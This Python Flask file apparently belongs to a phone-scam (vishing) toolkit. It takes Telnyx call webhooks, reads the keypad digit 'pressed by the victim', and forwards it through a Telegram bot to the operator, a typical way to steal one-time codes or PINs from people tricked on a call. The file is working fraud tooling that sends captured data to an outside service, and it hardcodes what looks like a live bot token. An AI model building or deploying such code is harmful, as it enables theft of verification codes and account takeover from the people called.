import os
import requests
from flask import Flask, request

app = Flask(__name__)

# Telegram Bot Token (replace with your actual bot token)
TELEGRAM_BOT_TOKEN = "7823113872:AAEjpmOaB2lq6ubnZCzwM3wa9qvCxw5B1e0"

@app.route('/telnyx_webhook', methods=['POST'])
def telnyx_webhook():
    data = request.json  # Capture the incoming data
    print(f"Received webhook: {data}")

    # Extract the digit pressed by the victim and the Telegram user ID from the query parameters
    digit = data.get('digit', None)
    telegram_user_id = data.get('telegram_user_id', None)

    if digit:
        print(f"Digit Pressed: {digit}")
        # Send a direct message to the Telegram user
        send_telegram_message(telegram_user_id, f"The victim pressed: {digit}")
    else:
        print("No digit pressed.")

    return 'OK', 200  # Return acknowledgment

def send_telegram_message(user_id, message):
    """Send a message to the Telegram user."""
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    params = {'chat_id': user_id, 'text': message}
    response = requests.get(url, params=params)
    print(f"Sent message to Telegram user {user_id}: {message}, Response: {response.status_code}")

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
